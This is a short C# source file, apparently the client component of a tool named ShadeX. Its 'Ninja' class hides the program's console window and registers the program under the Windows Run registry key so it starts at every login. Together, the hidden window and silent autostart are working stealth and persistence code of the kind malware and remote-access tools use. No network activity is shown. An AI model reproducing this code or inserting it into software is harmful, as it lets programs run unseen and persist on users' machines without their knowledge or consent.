using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

namespace ShadeX_Client
{
    public class Ninja
    {
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("Kernel32")]
        private static extern IntPtr GetConsoleWindow();

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        public static void Hide()
        {
            IntPtr hwnd;
            hwnd = GetConsoleWindow();
            ShowWindow(hwnd, SW_HIDE);
        }

        public static void AddStartup(string appName, string path)
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.SetValue(appName, "\"" + path + "\"");
            }
        }
    }
}
